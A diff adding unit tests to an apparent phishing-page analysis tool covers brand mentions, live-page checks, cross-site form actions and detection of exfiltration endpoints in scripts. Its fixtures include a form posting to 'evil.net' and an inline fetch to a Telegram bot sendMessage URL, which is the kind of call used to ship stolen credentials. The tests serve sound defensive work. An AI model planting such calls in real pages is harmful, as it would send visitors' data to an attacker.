@@ -74,3 +74,32 @@ def test_brand_mention_whole_word() -> None:
     df = _df([{"title": "Apple ID login"}, {"title": "pineapple recipes"},
               {"extracted_text": "add me on LINE"}, {"extracted_text": "deadline today"}])
     assert list(d.brand_mention(df)) == [True, False, True, False]
+
+
+def test_live_no_inputs_excludes_dead() -> None:
+    df = _df([
+        {"input_count": 0, "http_status": 200, "has_html": True, "text_length": 500, "title": "x"},  # live, no inputs
+        {"input_count": 0, "http_status": 404, "has_html": True, "text_length": 500, "title": "x"},  # dead_strong
+        {"input_count": 0, "http_status": 200, "has_html": True, "text_length": 10, "title": "x"},   # dead_weak
+    ])
+    assert list(d.live_no_inputs(df)) == [True, False, False]
+
+
+def test_form_action_breakdown_three_groups() -> None:
+    df = _df([
+        {"domain": "a.com", "form_actions": ["https://a.com/login"]},        # same
+        {"domain": "a.com", "form_actions": ["https://evil.net/x"]},         # cross
+        {"domain": "a.com", "form_actions": ["#"]},                          # unknown
+        {"domain": "a.com", "form_actions": [""]},                           # unknown
+        {"domain": "a.com", "form_actions": None},                          # no form -> excluded
+    ])
+    table, n = d.form_action_breakdown(df)
+    assert n == 4
+    pct = dict(zip(table["group"], table["pct_of_pages_with_forms"]))
+    assert pct["explicit_same_site"] == 25.0 and pct["cross_site"] == 25.0 and pct["unknown_js_or_default"] == 50.0
+
+
+def test_exfil_endpoint_in_scripts() -> None:
+    h = pd.DataFrame({"inline_scripts": [["fetch('https://api.telegram.org/bot123/sendMessage')"],
+                                         ["console.log('hi')"]]})
+    assert list(d.exfil_endpoint_in_scripts(h)) == [True, False]
